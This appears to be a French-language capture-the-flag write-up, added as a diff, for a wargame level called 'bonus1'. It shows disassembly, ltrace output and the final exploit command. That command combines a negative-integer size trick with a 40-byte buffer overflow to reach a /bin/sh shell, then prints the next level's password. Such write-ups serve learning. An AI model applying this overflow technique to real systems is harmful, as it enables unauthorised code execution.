@@ -1,0 +1,40 @@
+du coup on disas main on voit un atoi 
+
+   0x08048478 <+84>:    cmpl   $0x574f4c46,0x3c(%esp)
+								0x574f4c46
+ltrace ./bonus1 1400000000 =	0x53724e00
+				1464000000 =	0x5742de00
+				1464815430 =	0x574f4f46
+				1464814662 =	0x574f4c46
+
+bon bon apres plus de 100 try me voila pas avancer mais c'etait pour le fun
+
+bon du coup on voit qu'apres le cmp 0x574f4c46 on a un /bin/sh
+ce qu'on cherche tous le temps
+donc on doit trouver une facon de rentrer dans ce if
+nb = atoi(argv[1]);
+if (nb < 10)
+
+du coup il faut partir sur les negatif avec l'arg 1 pour pouvoir donner au memcpy assez de carac a copier 
+et avec le second arg il faut overflow et rediriger sur 0x574f4c46 = '\x46\x4c\x4f\x57'
+pour overflow le 40 il faut donc 'A' * 40 +  '\x46\x4c\x4f\x57'
+
+et du coup il nous faut 40 carac alors moi j'utilise ltrace comme ca pour voir les carac que je peux donner
+ltrace ./bonus1 -2 $(python -c "print('A' * 40 +  '\x46\x4c\x4f\x57')")
+memcpy(0xbffff5a4, "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"..., 4294967288 <unfinished ...>
+4294967288 ca fait trop ca segfault
+je vais try du coup int min
+
+memcpy(0xbffff594, "AAAA", 4)
+c le min donc 0 = 4 normal on va up
+
+-2147483640
+memcpy(0xbffff594, "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"..., 32)   
+toujours pas il nous faut 44
+
+./bonus1 -2147483637 $(python -c "print('A' * 40 +  '\x46\x4c\x4f\x57')")
+
+lets go!!!!!!!!!!
+
+$ cat /home/user/bonus2/.pass
+579bd19263eb8655e4cf7b742d75edf8c38226925d78db8163506f5191825245
